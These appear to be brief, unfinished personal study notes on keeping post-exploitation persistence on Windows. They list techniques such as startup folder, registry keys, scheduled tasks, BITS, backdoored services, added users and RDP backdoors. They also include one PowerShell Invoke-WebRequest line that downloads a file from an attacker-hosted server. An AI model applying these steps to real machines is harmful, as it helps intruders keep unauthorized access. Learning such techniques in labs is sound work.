Persistence - post exploitation to keep access

two types
	Low priv
		persistence under normal user
			maybe stealthier?
			if there is a exposed path to root, not a bad idea
	privileged user
		priv esc and install persistence

keeping persistence
	startup folder
	editing registry keys
	using scheduled tasks
	using BITS
	backdoored service
	creating another user
	backdooring RDP

Transfer the file by hosting a python server and using the powershell command
	Invoke-WebRequest http://ip:port/path -Outfile filename

Startup Folder Persistence

Do later, machine is continually dying, not fun
